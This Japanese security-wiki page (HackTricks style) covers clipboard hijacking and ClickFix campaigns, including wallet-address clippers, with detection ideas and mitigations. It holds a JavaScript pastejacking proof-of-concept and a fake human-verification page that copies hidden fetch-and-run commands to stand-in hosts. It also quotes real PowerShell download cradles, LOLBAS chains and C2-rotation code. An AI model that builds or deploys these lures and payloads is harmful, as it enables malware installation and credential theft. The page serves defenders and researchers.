# Clipboard Hijacking (Pastejacking) 攻撃

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしたもの以外は、決して貼り付けないこと。」– 昔からあるが、今でも有効なアドバイス

## 概要

Clipboard hijacking（*pastejacking* とも呼ばれる）は、ユーザーがコマンドを確認せずに頻繁にコピー＆ペーストすることを悪用します。悪意のある Web ページ（または Electron や Desktop アプリケーションなど、JavaScript を実行できるコンテキスト）が、攻撃者の用意したテキストをシステムのクリップボードにプログラムから書き込みます。被害者は、通常は巧妙に作られたソーシャルエンジニアリングの指示によって、**Win + R**（「ファイル名を指定して実行」ダイアログ）、**Win + X**（クイックアクセス / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*貼り付ける*よう促され、任意のコマンドが即座に実行されます。

**ファイルのダウンロードも添付ファイルのオープンもない**ため、この手法は、添付ファイル、マクロ、または直接的なコマンド実行を監視する、ほとんどのメールおよび Web コンテンツのセキュリティ対策を回避します。そのため、NetSupport RAT、Latrodectus loader、Lumma Stealer などの一般的なマルウェアファミリーを配布するフィッシングキャンペーンで、この攻撃がよく使われます。<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

**Clipboard hijacking** の別の手法では、コマンドを貼り付けるのではなく、被害者が**暗号資産ウォレットアドレス**をコピーするのを待ち、貼り付ける直前に攻撃者が管理するアドレスへ密かに置き換えます。長いウォレットアドレス形式では、ユーザーが先頭や末尾の文字だけを確認することが多いため、特に効果的です。<sup>[[8]](#references)</sup>

よく見られる実例の特徴:
- **軽量な loader + 多重にネストされた payload**: 表向きの app/exe は正規の取引ツールや「利益」ツールに見えますが、本物の clipper は bundle の奥深くに隠されています（例: .NET loader がネストされた Rust payload を起動する）。
- **正規表現による置換**: malware は `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...`、さらには **44文字の Solana 風**文字列などに一致する文字列を検出し、攻撃者のウォレットアドレスに書き換えます。
- **大規模なウォレットローテーション**: 最新の Windows サンプルでは、盗難のたびにウォレットの評判が低下するのを抑えるため、単一の固定アドレスではなく、通貨ごとに**数千件**の置換用ウォレットアドレスを埋め込んでいる場合があります。<sup>[[8]](#references)</sup>

### Windows clipper の処理フロー

一般的な実装では、**`AddClipboardFormatListener`** で登録された非表示ウィンドウを使います。クリップボードが更新されるたびに、malware は通常、次の関数を呼び出します。<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 現在のクリップボードデータにアクセスする。
- **`GetClipboardData`** → テキストを読み取る。
- **`EmptyClipboard`** + **`SetClipboardData`** → ウォレット文字列を攻撃者の値に置き換える。

clipper でよく見られる、最小限の検出用正規表現:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

ユーザーレベルの永続化で十分な影響を与えられます。確認されている手口の一例は次のとおりです。<sup>[[8]](#references)</sup>
- ペイロードを **`%APPDATA%\silke\silke.exe`** にコピーする
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` に **Startup-folder LNK** を作成する

検出のヒント:
- Clipboard APIを継続的に呼び出しながら、`%APPDATA%` およびユーザーの **Startup** フォルダーに書き込むプロセス。
- LNKや実行ファイルの新規作成後に、ウォレットアドレスをクリップボードに上書きする挙動。
- 多数の未使用ファイルと、ネストされたバイナリを起動する小さなランチャーを含むアーカイブや偽ソフトウェアバンドル。

### macOSでソーシャルエンジニアリングを利用したquarantineの削除とLaunchAgentによる永続化

macOSでは、Gatekeeperがアプリについて「破損している」または「未確認の開発元からのもの」と警告した場合、被害者に右クリックして **Open** を選ぶよう指示する **`unlocker.command`** ヘルパーを同梱するキャンペーンがあります。このスクリプトはquarantineを削除し、近くにある `.app` を起動するだけです。<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

これはGatekeeper exploitではありません。Gatekeeperの判定が`com.apple.quarantine` xattrに依存することを悪用した、**ソーシャルエンジニアリングによるquarantine bypass**です。<sup>[[8]](#references)</sup>

実行後、clipperは以下を書き込むことで、現在のユーザーとして永続化できます。<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad`と`KeepAlive`を設定したLaunchAgent

防御上知っておくべき点として、一部のサンプルは約30秒ごとにLaunchAgentとwrapperを書き直す**自己修復型watchdog**を実装しています。**実行中のプロセスを終了せずに**先にplistを削除すると、マルウェアがすぐに再作成する可能性があります。<sup>[[8]](#references)</sup> 安全なクリーンアップの順序:
1. 実行中のclipperプロセスを終了する。
2. LaunchAgent plistをアンロードして削除する。
3. `~/launch.sh`とコピーされたpayloadを削除する。

### 配布に関する注記: 信用を高める偽の評判

このファミリーでは、マルウェア自体は技術的にシンプルなままでも、**配布レイヤー**が大きな役割を果たします。偽のGitHub stars/forks、SourceForgeのレビューやダウンロード、YouTubeチュートリアルのコメントや再生回数、無害に見えるVirusTotalのコメントや投票を利用し、実行前にバイナリを信頼できるように見せかけます。<sup>[[8]](#references)</sup>

## 強制的なコピーボタンと隠されたpayload（macOS one-liner）

一部のmacOS infostealerはインストーラーサイト（例: Homebrew）を複製し、ユーザーが表示テキストの一部だけを選択できないように**「Copy」ボタンの使用を強制**します。クリップボードには、想定されるインストールコマンドに加え、Base64 payload（例: `...; echo <b64> | base64 -d | sh`）が追加されているため、1回貼り付けるだけで両方が実行され、UI上では追加のステージが隠されます。<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

以前のキャンペーンでは `document.execCommand('copy')` が使われていましたが、最近のものは非同期の **Clipboard API**（`navigator.clipboard.writeText`）を利用します。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake の手口

1. ユーザーがタイポスクワッティングされたサイト、または侵害されたサイト（例: `docusign.sa[.]com`）にアクセスする
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、Base64エンコードされた PowerShell のワンライナーをクリップボードにひそかに保存する。
3. HTMLの指示で被害者に次のように促す: *「**Win + R** を押し、コマンドを貼り付けて Enter を押すと問題が解決します。」*
4. `powershell.exe` が実行され、正規の実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（典型的な DLL sideloading）。
5. ローダーが追加のステージを復号し、シェルコードを注入して永続化（例: スケジュールされたタスク）を設定し、最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。<sup>[[1]](#references)</sup>

### NetSupport RAT の実行チェーンの例

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe`（正規の Java WebStart）は、自身のディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** を使って API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ（`data_3.bin`、`data_4.bin`）をダウンロードします。ローリング XOR キー `"https://google.com/"` を使ってこれらを復号し、最終的な shellcode をインジェクトした後、NetSupport RAT である **client32.exe** を `C:\ProgramData\SecurityCheck_v1\` に解凍します。<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe**で`la.txt`をダウンロード
2. **cscript.exe**内でJScript downloaderを実行
3. MSI payloadを取得 → 署名済みアプリケーションの隣に`libcef.dll`を配置 → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA経由のLumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta**の呼び出しにより、非表示のPowerShellスクリプトが起動し、`PartyContinued.exe`を取得します。続いて`Boat.pst`（CAB）を展開し、`extrac32`とファイル連結を使って`AutoIt3.exe`を再構築します。最後に、ブラウザー認証情報を`sumeriavgv.digital`へ流出させる`.a3x`スクリプトを実行します。<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部のClickFixキャンペーンでは、ファイルのダウンロードを完全に省略し、被害者に、WSH経由でJavaScriptを取得・実行して永続化し、C2を毎日ローテーションするワンライナーを貼り付けるよう指示します。観測された攻撃チェーンの例:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

主な特徴
- カジュアルな調査を回避するため、難読化されたURLを実行時に逆順にする。
- JavaScriptはStartup LNK（WScript/CScript）を介して永続化し、当日の日付に基づいてC2を選択することで、ドメインを迅速にローテーションできる。<sup>[[3]](#references)</sup>

日付に基づいてC2をローテーションする最小限のJSフラグメント：<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

次の段階では、通常、永続化を確立してRAT（例: PureHVNC）を取得するloaderを展開します。多くの場合、ハードコードされた証明書にTLSをピン留めし、通信をチャンク化します。<sup>[[3]](#references)</sup>

この亜種に特化した検知アイデア
- プロセスツリー: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（または`cscript.exe`）。
- スタートアップアーティファクト: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`内のLNKから、`%TEMP%`/`%APPDATA%`配下のJSパスを指定してWScript/CScriptを起動。
- `.split('').reverse().join('')`または`eval(a.responseText)`を含むレジストリ/RunMRUおよびコマンドラインテレメトリ。
- 長いコマンドラインを使わずに長いスクリプトを渡すため、大きなstdinペイロードを伴う`powershell -NoProfile -NonInteractive -Command -`の繰り返し実行。
- 後続で、アップデーターを装ったタスク/パス（例: `\GoogleSystem\GoogleUpdater`）から、`regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`などのLOLBinsを実行するScheduled Tasks。

脅威ハンティング
- 日替わりのC2ホスト名と、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`形式のURL。
- クリップボードへの書き込みイベントの後にWin+Rで貼り付け、その直後に`powershell.exe`が実行される流れを相関分析する。

ブルーチームは、クリップボード、プロセス作成、レジストリのテレメトリを組み合わせて、pastejackingの悪用を特定できます。

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`には**Win + R**コマンドの履歴が保持されます。通常とは異なるBase64/難読化されたエントリを探してください。
* Security Event ID **4688**（Process Creation）で、`ParentImage` == `explorer.exe`かつ`NewProcessName`が{ `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }に含まれるイベント。
* Event ID **4663**で、疑わしい4688イベントの直前に`%LocalAppData%\Microsoft\Windows\WinX\`または一時フォルダー内でファイルが作成されていないか確認。
* EDRのクリップボードセンサー（利用可能な場合）: `Clipboard Write`の直後に新しいPowerShellプロセスが起動していないか相関分析する。

## IUAM風の検証ページ（ClickFix Generator）: クリップボードからコンソールへのコピー + OS対応ペイロード

最近のキャンペーンでは、偽のCDN/ブラウザー検証ページ（「Just a moment…」、IUAM風）が大量に作成され、ユーザーにクリップボードからOS別のコマンドをコピーしてネイティブコンソールに貼り付けるよう促します。これにより実行がブラウザーのサンドボックス外に移り、WindowsとmacOSの両方で機能します。<sup>[[4]](#references)</sup>

ビルダーが生成するページの主な特徴
- `navigator.userAgent`でOSを検出し、ペイロードを調整（WindowsのPowerShell/CMDとmacOSのTerminal）。非対応OS向けには、実在するように見せるための任意のデコイ/no-opも用意。
- チェックボックスやCopyなどの無害なUI操作でクリップボードへ自動コピー。表示されるテキストとクリップボードの内容が異なる場合もあります。
- モバイルをブロックし、手順を示すポップオーバーを表示: Windows → Win+R→貼り付け→Enter、macOS → Terminalを開く→貼り付け→Enter。
- 任意の難読化と、侵害されたサイトのDOMをTailwindスタイルの検証UIで上書きする単一ファイルのインジェクター（新たなドメイン登録は不要）。<sup>[[4]](#references)</sup>

例: クリップボードの内容との不一致 + OS対応の分岐
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOSでの初回実行の永続化
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使うと、ターミナルを閉じた後も実行が継続し、目に見える痕跡を減らせます。<sup>[[4]](#references)</sup>

侵害されたサイトでのページの乗っ取り
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM-style lureに特有の検知・ハンティングのアイデア
- Web: Clipboard APIを検証ウィジェットに紐付けるページ、表示テキストとクリップボードのペイロードの不一致、不審なコンテキストでの`navigator.userAgent`による分岐やTailwind＋シングルページの置き換え。
- Windows endpoint: ブラウザー操作の直後に発生する`explorer.exe` → `powershell.exe`/`cmd.exe`の起動、`%TEMP%`から実行されるbatch/MSIインストーラー。
- macOS endpoint: ブラウザーイベントの直後に、Terminal/iTermから`bash`/`curl`/`base64 -d`が起動され、`nohup`が使われるケース。Terminalを閉じた後もバックグラウンドジョブが継続するケース。
- `RunMRU`のWin+R履歴とクリップボードへの書き込みを、後続するコンソールプロセスの作成と相関させる。

関連する手法については以下も参照

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026年の偽CAPTCHA / ClickFixの進化（ClearFake、Scarlet Goldfinch）

- ClearFakeは引き続きWordPressサイトを侵害し、外部ホスト（Cloudflare Workers、GitHub/jsDelivr）や、ブロックチェーンの「etherhiding」呼び出し（例：`bsc-testnet.drpc[.]org`などのBinance Smart Chain APIエンドポイントへのPOST）を連鎖させるloader JavaScriptを注入し、最新のlureロジックを取得しています。最近のオーバーレイでは、何かをダウンロードさせる代わりに、ユーザーに1行のコマンドをコピー＆ペーストさせる偽CAPTCHAが多用されています（T1204.004）。<sup>[[6]](#references)</sup>
- 初期実行は、署名済みスクリプトホスト/LOLBASに委ねられるケースが増えています。2026年1月のチェーンでは、以前使われていた`mshta`を、組み込みの`SyncAppvPublishingServer.vbs`を`WScript.exe`経由で実行する方式に置き換え、PowerShell風の引数にエイリアスやワイルドカードを使ってリモートコンテンツを取得していました。<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` は署名済みで、通常は App-V で使用されます。`WScript.exe` と通常とは異なる引数（`gal`/`gcm` エイリアス、ワイルドカードを使った cmdlet、jsDelivr URL）を組み合わせると、ClearFake の高シグナルな LOLBAS stage になります。<sup>[[6]](#references)</sup>
- 2026年2月、偽 CAPTCHA payload は純粋な PowerShell download cradle に回帰しました。実例を2つ紹介します。<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - 1つ目のchainはメモリ内で実行する `iex(irm ...)` grabberです。2つ目は `WinHttp.WinHttpRequest.5.1` を使って段階的に処理し、一時 `.ps1` を書き込んだ後、非表示ウィンドウで `-ep bypass` を付けて起動します。<sup>[[6]](#references)</sup>

これらのvariantの検知・ハンティングのヒント
- プロセスの系譜: ブラウザー → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`、またはclipboardへの書き込み／Win+Rの直後にPowerShell cradlesが実行される。
- コマンドラインのキーワード: `SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Workerのドメイン、または生のIPアドレスを使った `iex(irm ...)` パターン。
- Network: Web閲覧の直後に、スクリプトホスト／PowerShellからCDN workerホストまたはblockchain RPC endpointへアウトバウンド通信が行われる。
- File/registry: `%TEMP%` 配下に一時 `.ps1` が作成され、RunMRUエントリにこれらのone-linerが含まれる。外部URLや難読化されたalias文字列を使って署名済みscript LOLBAS（WScript/cscript/mshta）が実行される場合は、blockまたはalertする。

## 2026年6月のClickFix tradecraft: paste telemetry、偽のverificationコメント、LOLBIN chaining

Red Canaryの最近のtelemetryによると、安定したindicatorは**特定のコマンドそのものではなく**、**ユーザー操作による貼り付けと実行**、**信頼されたinterpreter/LOLBIN**、**難読化されたflag**、**リモート取得**、および**即時実行**の組み合わせです。<sup>[[7]](#references)</sup>

### 注目すべきoperatorのパターン

- **貼り付け確認telemetry**: 一部のpayloadは、本処理の前に `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` を呼び出します。これにより、ウィンドウを短時間かつ目立たない状態に保ちながら、ユーザー操作を確認します。
- **偽のverificationコメント**: PowerShellのone-linerに `# Security check ✔️ I'm not a robot Verification ID: 138105` のような文字列を追加することがあります。Run / `cmd.exe` / PowerShellのhistoryに貼り付けられた後も、CAPTCHA関連のコマンドに見せかけるためです。
- **動的なURL再構成**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` は、コマンドラインに固定URLを表示せずに、メモリ内でのダウンロードと実行を行います。
- **偽装したinstallerの実行**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` は、大文字小文字の不自然な使い方やUnicode風の文字をflagに使い、脆弱な検知を回避しつつ `msiexec.exe` に見せかけます。
- **キャレットでエスケープしたLOLBIN chain**: `cmd.exe` は `^` エスケープ（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`）でキーワードを隠し、入れ子のshellを最小化して起動し、攻撃者のコンテンツを `.pdf` のような無害な拡張子で保存した後、`mshta` 経由で実行できます。<sup>[[7]](#references)</sup>
## Mitigations

1. Browserのhardening – clipboardへの書き込みを無効にする（`dom.events.asyncClipboard.clipboardItem` など）か、ユーザージェスチャーを必須にする。
2. Security awareness – 機密性の高いコマンドは*入力する*か、まずtext editorに貼り付けるようユーザーに教える。
3. PowerShell Constrained Language Mode / Execution PolicyとApplication Controlで、任意のone-linerをblockする。
4. Network controls – 既知のpastejackingおよびmalware C2 domainへのアウトバウンドrequestをblockする。

## Related Tricks

* **Discord Invite Hijacking** は、悪意のあるserverにユーザーを誘導した後、同じClickFixの手法を悪用することがよくあります。
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [クリックを修正する: ClickFix攻撃ベクターを防ぐ](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PastejackingのPoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – 純粋なカーテンの向こう側: RATからBuilder、Coderへ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: IUAM ClickFix Generatorを初めて公開](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: 2026年2月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: 2026年6月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – 星からupvoteへ: 偽の評判を利用したcrypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
